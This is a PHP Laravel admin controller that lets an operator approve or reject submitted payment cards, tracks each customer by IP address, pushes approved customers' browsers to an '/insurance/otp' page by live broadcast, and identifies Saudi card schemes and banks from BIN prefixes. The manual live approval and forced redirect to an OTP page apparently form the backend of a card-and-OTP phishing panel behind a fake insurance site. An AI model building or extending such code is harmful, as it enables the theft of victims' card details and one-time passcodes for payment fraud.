<?php

namespace App\Http\Controllers\Admin;

use App\Events\CustomerRedirected;
use App\Events\PaymentApproved;
use App\Events\PaymentRejected;
use App\Http\Controllers\Admin\Traits\NotifiesDashboard;
use App\Http\Controllers\Controller;
use App\Http\Requests\Admin\RejectPaymentCardRequest;
use App\Models\PaymentCard;
use Illuminate\Http\JsonResponse;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\Log;

class AdminPaymentCardController extends Controller
{
    use NotifiesDashboard;

    /**
     * Approve a payment card
     */
    public function approve(int $id): JsonResponse
    {
        $card = PaymentCard::findOrFail($id);

        if ($card->status !== 'pending') {
            return response()->json([
                'success' => false,
                'message' => 'هذه البطاقة تم معالجتها مسبقاً',
            ], 422);
        }

        $card->approve(Auth::id());

        // Flush customer list cache so dashboard polls get fresh data
        $this->flushCustomerCache();

        $customerIp = $card->customer?->ip_address ?? '';
        try {
            broadcast(new PaymentApproved($customerIp))->toOthers();
        } catch (\Throwable $e) {
            Log::warning('Broadcast failed (approveCard): '.$e->getMessage());
        }

        // Redirect customer to OTP page via global redirect channel
        if ($customerIp) {
            try {
                $card->customer->update(['current_page' => '/insurance/otp']);
                broadcast(new CustomerRedirected($customerIp, '/insurance/otp'));
            } catch (\Throwable $e) {
                Log::warning('CustomerRedirect broadcast failed (approveCard): '.$e->getMessage());
            }
        }

        $this->notifyDashboard($customerIp, 'payment_approved');
        $this->refreshPaymentViewed($customerIp);

        return response()->json([
            'success' => true,
            'message' => 'تمت الموافقة على البطاقة بنجاح',
        ]);
    }

    /**
     * Reject a payment card
     */
    public function reject(int $id, RejectPaymentCardRequest $request): JsonResponse
    {
        $card = PaymentCard::findOrFail($id);

        if ($card->status !== 'pending') {
            return response()->json([
                'success' => false,
                'message' => 'هذه البطاقة تم معالجتها مسبقاً',
            ], 422);
        }

        $card->reject($request->reason, Auth::id());

        // Flush customer list cache so dashboard polls get fresh data
        $this->flushCustomerCache();

        $customerIp = $card->customer?->ip_address ?? '';
        try {
            broadcast(new PaymentRejected($customerIp, $request->reason))->toOthers();
        } catch (\Throwable $e) {
            Log::warning('Broadcast failed (rejectCard): '.$e->getMessage());
        }

        $this->notifyDashboard($customerIp, 'payment_rejected');
        $this->refreshPaymentViewed($customerIp);

        return response()->json([
            'success' => true,
            'message' => 'تم رفض البطاقة',
        ]);
    }

    /**
     * BIN lookup — identify card brand/type from first 6-8 digits
     */
    public function binLookup(string $bin): JsonResponse
    {
        $bin = preg_replace('/\D/', '', $bin);

        if (strlen($bin) < 6) {
            return response()->json(['error' => 'BIN must be at least 6 digits'], 422);
        }

        $first = (int) substr($bin, 0, 1);
        $firstTwo = (int) substr($bin, 0, 2);
        $firstFour = (int) substr($bin, 0, 4);
        $binSix = substr($bin, 0, 6);

        // ── Scheme detection ────────────────────────────────────────
        $madaBins = config('bank_bins._mada_bins', []);
        $isMada = in_array($binSix, $madaBins);

        $scheme = match (true) {
            $isMada => 'mada',
            $first === 4 => 'visa',
            $firstTwo >= 51 && $firstTwo <= 55 => 'mastercard',
            $firstTwo === 34 || $firstTwo === 37 => 'amex',
            $firstFour === 5078 || $firstFour === 9682 => 'mada',
            $firstTwo === 62 => 'unionpay',
            default => 'unknown',
        };

        // ── Bank identification from config ─────────────────────────
        $saudiBanks = config('bank_bins', []);
        $bankCode = null;
        $bankName = null;
        $bankNameAr = null;

        foreach ($saudiBanks as $code => $bank) {
            if (str_starts_with($code, '_')) {
                continue;
            } // skip meta keys
            foreach ($bank['prefixes'] as $prefix) {
                if (str_starts_with($binSix, $prefix) || str_starts_with($bin, $prefix)) {
                    $bankCode = $code;
                    $bankName = $bank['name'];
                    $bankNameAr = $bank['name_ar'];
                    break 2;
                }
            }
        }

        return response()->json([
            'scheme' => $scheme,
            'type' => $scheme === 'mada' ? 'debit' : ($first === 4 || ($firstTwo >= 51 && $firstTwo <= 55) ? 'unknown' : 'credit'),
            'brand' => null,
            'bank_code' => $bankCode,
            'bank' => [
                'name' => $bankName,
                'name_ar' => $bankNameAr,
            ],
        ]);
    }
}
